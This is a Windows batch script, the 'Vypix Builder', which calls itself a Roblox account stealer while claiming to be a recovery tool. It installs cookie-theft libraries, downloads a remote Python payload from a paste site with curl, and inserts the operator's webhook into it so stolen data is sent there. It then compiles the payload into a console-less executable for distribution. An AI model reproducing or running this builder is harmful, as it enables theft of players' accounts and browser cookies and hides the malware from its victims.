@echo off
chcp 65001
cls
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo                                                     Enter Username 
set /p name=".                                                   "
:main
cls
title Vypix Builder / Welcome: %name% [FREE]
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo                                             ██    ██ ██    ██ ██████  ██ ██   ██ 
echo                                             ██    ██  ██  ██  ██   ██ ██  ██ ██  
echo                                             ██    ██   ████   ██████  ██   ███   
echo                                              ██  ██     ██    ██      ██  ██ ██  
echo                                               ████      ██    ██      ██ ██   ██ 
echo.
echo                                                 Welcome %name% To VYPIX [FREE]
echo.
echo                                                     [1] Start Installer 
echo                                                      [2] Start Builder 
echo                                                       [3] About VYPIX 
echo.
set /p answer="                                    Choice > "
if /I "%answer%"=="1" goto :install
if /I "%answer%"=="2" goto :Build
if /I "%answer%"=="3" goto :About



:install
pip install pyinstaller
pip install requests
pip install robloxpy
pip install browser_cookie3
pip install psutil
pip install wmi
pause
goto main

:about
cd /d "%~dp0"
chcp 65001  > nul
call cls
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo                                           ██    ██ ██    ██ ██████  ██ ██   ██ 
echo                                           ██    ██  ██  ██  ██   ██ ██  ██ ██  
echo                                           ██    ██   ████   ██████  ██   ███   
echo                                            ██  ██     ██    ██      ██  ██ ██  
echo                                             ████      ██    ██      ██ ██   ██                            
echo.
echo.
echo                                                       Vypix On Top
echo                             Vypix AKA JJZ Logger Is a roblox account recovery tool in development
echo                                               Your Stealer Version is 0.0.1
echo.
echo.
echo                                             Telegram : https://t.me/syntheticcs
echo.
pause
goto main

:build
cls
cd /d "%~dp0"
chcp 65001  > nul
call cls
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo                                           ██    ██ ██    ██ ██████  ██ ██   ██ 
echo                                           ██    ██  ██  ██  ██   ██ ██  ██ ██  
echo                                           ██    ██   ████   ██████  ██   ███   
echo                                            ██  ██     ██    ██      ██  ██ ██  
echo                                             ████      ██    ██      ██ ██   ██                            
echo.
echo                                               Your Stealer Version is 0.0.1
echo.
echo.
echo                                             Telegram : https://t.me/syntheticcs
echo.
set /p webhook="Whats your Webhook > "
set url=https://sharetext.me/raw/wfbd6oxszq
set file=vypix.py

curl %url% > %file%

setlocal enabledelayedexpansion
set "search=Webhookssz"
set "replace=%webhook%"
for /f "delims=" %%i in (%file%) do (
    set "line=%%i"
    set "line=!line:%search%=%replace%!"
    echo !line!>> %file%.tmp
)
move /y %file%.tmp %file%
echo.
echo.
echo PRESS ENTER TO BUILD EXE 
pause
pyinstaller --onefile --noconsole vypix.py